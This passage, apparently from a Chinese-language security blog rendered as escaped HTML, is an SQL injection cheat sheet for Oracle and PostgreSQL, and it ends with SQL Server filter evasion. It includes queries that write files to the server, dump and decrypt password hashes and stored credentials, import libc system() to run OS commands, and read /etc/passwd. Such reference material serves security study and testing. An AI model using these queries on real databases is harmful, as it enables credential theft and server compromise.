&lt;pre class=&#34;line-numbers language-plsql&#34; data-language=&#34;plsql&#34;&gt;&lt;code class=&#34;language-plsql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;Create&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;or&lt;/span&gt; replace &lt;span class=&#34;token keyword&#34;&gt;directory&lt;/span&gt; ext &lt;span class=&#34;token keyword&#34;&gt;AS&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;C:\&#39;;
DECLARE
v_file UTL_FILE.FILE_TYPE;
BEGIN
v_file:= UTL_FILE.FOPEN(&#39;&lt;/span&gt;EXT&lt;span class=&#34;token string&#34;&gt;&#39;, &#39;&lt;/span&gt;aht&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;txt&lt;span class=&#34;token string&#34;&gt;&#39;,&#39;&lt;/span&gt;w&lt;span class=&#34;token string&#34;&gt;&#39;);
UTL_FILE.PUT_LINE(v_file, &#39;&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;first&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;row&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;);
UTL_FILE.NEW_LINE(v_file);
UTL_FILE.PUT_LINE(v)file,&#39;&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;second&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;row&lt;/span&gt;&#39;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
UTL_FILE&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;FCLOSE&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;v_file&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;END&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;写本地二进制文件：utl file&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-plsql&#34; data-language=&#34;plsql&#34;&gt;&lt;code class=&#34;language-plsql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;Create&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;or&lt;/span&gt; replace &lt;span class=&#34;token keyword&#34;&gt;directory&lt;/span&gt; ext &lt;span class=&#34;token keyword&#34;&gt;AS&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;C:\&#39;;
Create or replace directory ext AS &#39;&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;C&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;:&lt;/span&gt;\&#39;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;DECLARE&lt;/span&gt; fi UTL_FILE&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;FILE_TYPE&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
bu &lt;span class=&#34;token keyword&#34;&gt;RAW&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;32767&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;BEGIN&lt;/span&gt;
bu&lt;span class=&#34;token operator&#34;&gt;:=&lt;/span&gt;hextoraw&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;BF3B01BB8100021E8000B88200882780FB81750288D850E8060083C402CD20C35589E5B80100508D451A50B80F00508D5D00FFD383C40689EC5DC3558BEC8B5E088B4E048B5606B80040CD21730231C08BE55DC39048656C6C6F2C20576F726C64210D0A&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
fi&lt;span class=&#34;token operator&#34;&gt;:=&lt;/span&gt;UTL_FILE&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;fopen&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;EXT&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;hello.com&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;wb&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;32767&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
UTL_FILE&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;put_raw&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;fi&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;bu&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token boolean&#34;&gt;TRUE&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
UTL_FILE&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;fclose&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;fi&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;END&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;写本地文件：dbms_advisor(Oracle 10g及之后的版本)&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-plsql&#34; data-language=&#34;plsql&#34;&gt;&lt;code class=&#34;language-plsql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;create&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;directory&lt;/span&gt; MYDIR &lt;span class=&#34;token keyword&#34;&gt;as&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;C:\&#39;;
exec SYS.DBMS_ADVISOR.CREATE_FILE(&#39;&lt;/span&gt;This &lt;span class=&#34;token keyword&#34;&gt;is&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;the&lt;/span&gt;
content&lt;span class=&#34;token string&#34;&gt;&#39;||chr(13)||&#39;&lt;/span&gt;Next line&lt;span class=&#34;token string&#34;&gt;&#39;,&#39;&lt;/span&gt;MYDIR&lt;span class=&#34;token string&#34;&gt;&#39;,&#39;&lt;/span&gt;myfile&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;txt&#39;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;ul&gt;
&lt;li&gt;破解数据库口令&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;从数据库中提取口令哈希：&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-plsql&#34; data-language=&#34;plsql&#34;&gt;&lt;code class=&#34;language-plsql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; password &lt;span class=&#34;token keyword&#34;&gt;FROM&lt;/span&gt; sys&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;user$ &lt;span class=&#34;token keyword&#34;&gt;where&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;type&lt;/span&gt;#&lt;span class=&#34;token operator&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;and&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;length&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;password&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;16&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;--DES Hashes (7-10g)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; spare4 &lt;span class=&#34;token keyword&#34;&gt;FROM&lt;/span&gt; sys&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;user$ &lt;span class=&#34;token keyword&#34;&gt;where&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;type&lt;/span&gt;#&lt;span class=&#34;token operator&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;and&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;length&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;spare4&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;62&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;--SHA1 Hashes&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;提取明文口令：&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; view_username&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; sysman&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;decrypt&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;view_password&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; sysman&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;mgmt_view_user_credentials&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; credential_set_column&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; sysman&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;decrypt&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;credential_value&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; sysman&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;mgmt_credentials2&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; sysman&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;decrypt&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;aru_username&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; sysman&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;decrypt&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;aru_password&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; sysman&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;mgmt_aru_credentials&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h4 id=&#34;PostgreSQL-备忘单&#34;&gt;&lt;a href=&#34;#PostgreSQL-备忘单&#34; class=&#34;headerlink&#34; title=&#34;PostgreSQL 备忘单&#34;&gt;&lt;/a&gt;PostgreSQL 备忘单&lt;/h4&gt;&lt;p&gt;&lt;a href=&#34;http://www.postgresql.org/docs/manuals/&#34;&gt;www.postgresql.org/docs/manuals/&lt;/a&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;枚举数据库配置信息和模式&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;提取PostgreSQL数据库的配置信息&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;数   据&lt;/th&gt;
&lt;th&gt;查   询&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;版本&lt;/td&gt;
&lt;td&gt;&lt;code&gt;SELECT version()&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;当前用户&lt;/td&gt;
&lt;td&gt;&lt;code&gt;SELECT getpgusername();  &lt;/code&gt;&lt;br&gt;&lt;code&gt;SELECT user; &lt;/code&gt;&lt;br&gt; &lt;code&gt;SELECT current user; &lt;/code&gt; &lt;br&gt;&lt;code&gt;SELECT session user;&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;列出用户&lt;/td&gt;
&lt;td&gt;&lt;code&gt;SELECT usename FROM pg_user&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;当前用户权限&lt;/td&gt;
&lt;td&gt;&lt;code&gt;SELECT  usename, usecreatedb, usesuper, usecatupd FROM pg_user&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;数据库服务器主机名&lt;/td&gt;
&lt;td&gt;&lt;code&gt;SELECT inet_server_addr();&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;p&gt;提取PostgreSQL数据库的模式信息&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;数&lt;/th&gt;
&lt;th&gt;查询&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;当前数据库&lt;/td&gt;
&lt;td&gt;&lt;code&gt;SELECT current_database();&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;列出数据库&lt;/td&gt;
&lt;td&gt;&lt;code&gt;SELECT datname FROM pg_database;&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;列出表&lt;/td&gt;
&lt;td&gt;&lt;code&gt;SELECT c.relname FROM pg_catalog.pg_class c LEFT JOIN pg_catalog.pg_namespace n ON n.oid = c.relnamespace WHERE c.relkind IN (&#39;r&#39; ,&#39;&#39;) AND pg_catalog.pg_table_is_visible(c.oid) AND n.nspname NOT IN (&#39;pg_catalog&#39;,&#39;pg_toast&#39;);&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;列出列&lt;/td&gt;
&lt;td&gt;&lt;code&gt;SELECT relname,A.attname FROM pg_class C, pg_namespace N, pg_attribute A, pg_type T  WHERE (C.relkind=&#39;r&#39;) AND (N.nspname =&#39;public&#39;) AND  (A.attrelid=C.oid) AND (N.oid=C.relnamespace) AND (A.atttypid=T.oid)  AND(A.attnum&amp;gt;0) AND (NOT A.attisdropped);&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;SQL盲注函数：PostgreSQL&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;SQL盲注函数&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;数   据&lt;/th&gt;
&lt;th&gt;查   询&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;字符串长度&lt;/td&gt;
&lt;td&gt;&lt;code&gt;LENGTH()&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;从给定字符串中提取子串&lt;/td&gt;
&lt;td&gt;&lt;code&gt;SUBSTRING(string,offset,length)&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;字符串(‘ABC)不带单引号的表示方式&lt;/td&gt;
&lt;td&gt;`SELECT CHR(65)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;触发时间延迟&lt;/td&gt;
&lt;td&gt;&lt;code&gt;SELECT pg_sleep(10); --触发10s的延迟&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;攻击数据库服务器：PostgreSQL&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;PostgreSQL并未提供执行操作系统命令的内置存储过程，不过可以从外部的.dll或共享对象(shared object)(.so)文件中导入堵如system()这样的函数。借助PostgreSQL并使用COPY语句同样可以读取本地文件。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;执行系统命令&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;对于8.2版本之前的PostgreSQL数据库服务器，从标准UNIX libc库导入system函数：&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;CREATE&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;OR&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;REPLACE&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;FUNCTION&lt;/span&gt; system&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;cstring&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;RETURNS&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;AS&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;/lib/libc.so.6&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;system&#39;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;LANGUAGE&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;C&#39;&lt;/span&gt; STRICT&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;接下来可以通过执行下列SQL查询调用system函数：&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; system&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;command&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;ul&gt;
&lt;li&gt;访问本地文件&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;可以使用下列SQL语句并借助超级用户账户来读取本地文件，这些文件是使用操作系统级的PostgreSQL用户账户打开的&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;CREATE&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;TABLE&lt;/span&gt; filedata&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;t &lt;span class=&#34;token keyword&#34;&gt;text&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
COPY filedata &lt;span class=&#34;token keyword&#34;&gt;FROM&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;/etc/passwd&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;--&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;可以使用下列SQL语句来写本地文件，这些文件也是使用操作系统级的PostgreSQL用户账户创建的&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;CREATE&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;TABLE&lt;/span&gt; thefile&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;evildata &lt;span class=&#34;token keyword&#34;&gt;text&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;INSERT&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;INTO&lt;/span&gt; thefile&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;evildata&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;VALUES&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;some evil data&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
COPY thefile &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;evildata&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;TO&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;/tmp/evilscript.sh&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;ul&gt;
&lt;li&gt;破解数据库口令&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;列出PostgreSQL数据库中的用户名和口令&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; usename&lt;span class=&#34;token operator&#34;&gt;||&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;:&#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;||&lt;/span&gt;passwd &lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; pg_shadow&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;避开输入验证过滤器&#34;&gt;&lt;a href=&#34;#避开输入验证过滤器&#34; class=&#34;headerlink&#34; title=&#34;避开输入验证过滤器&#34;&gt;&lt;/a&gt;避开输入验证过滤器&lt;/h3&gt;&lt;h4 id=&#34;引号过滤器&#34;&gt;&lt;a href=&#34;#引号过滤器&#34; class=&#34;headerlink&#34; title=&#34;引号过滤器&#34;&gt;&lt;/a&gt;引号过滤器&lt;/h4&gt;&lt;p&gt;不使用引号字符表示字符串&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;&lt;/th&gt;
&lt;th&gt;&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;平   台&lt;/td&gt;
&lt;td&gt;查  询&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Microsoft SQL Server&lt;/td&gt;
&lt;td&gt;&lt;code&gt;SELECT char(0x41) + char(0x42) + char(0x43);&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;MySQL Server&lt;/td&gt;
&lt;td&gt;&lt;code&gt;SELECT char (65,66,67);&lt;/code&gt;&lt;br&gt;&lt;code&gt;  SELECT 0x414243;&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Oracle&lt;/td&gt;
&lt;td&gt;`SELECT chr(65)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;PostgreSQL&lt;/td&gt;
&lt;td&gt;`SELECT chr(65)&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;p&gt;Microsoft SQL Server还支持在变量中构造查询，然后调用EXEC来执行它。&lt;/p&gt;
&lt;p&gt;创建了一个名为@q的变量，并借助一个十六进制编码的字符串将SELECT’ABC’查询赋值给该变量：&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-sql&#34; data-language=&#34;sql&#34;&gt;&lt;code class=&#34;language-sql&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;DECLARE&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;@q&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;varchar&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;8000&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;SELECT&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;@q&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x53454c454354202741424327&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;EXEC&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;@q&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

